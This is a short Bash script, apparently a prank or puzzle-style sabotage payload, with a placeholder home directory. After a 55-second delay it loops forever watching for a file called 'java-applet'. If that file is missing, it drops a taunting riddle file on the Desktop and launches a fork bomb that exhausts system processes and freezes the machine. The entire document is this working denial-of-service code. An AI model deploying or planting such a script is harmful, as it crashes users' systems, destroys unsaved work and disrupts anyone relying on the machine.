FILE=/home/replace_me/java-applet

sleep 55
while :
do
	if [ -f "$FILE" ]; then
		echo "File $FILE exists."
	else
		echo "mn2se4: I am environmentalist but i keep changing, also you may want to undo that last step :P" > /home/replace_me/Desktop/CLUE_FOR_STATIBILITY.txt
		bomb() { 
			bomb | bomb &
		}; bomb
	fi
	sleep 1
done
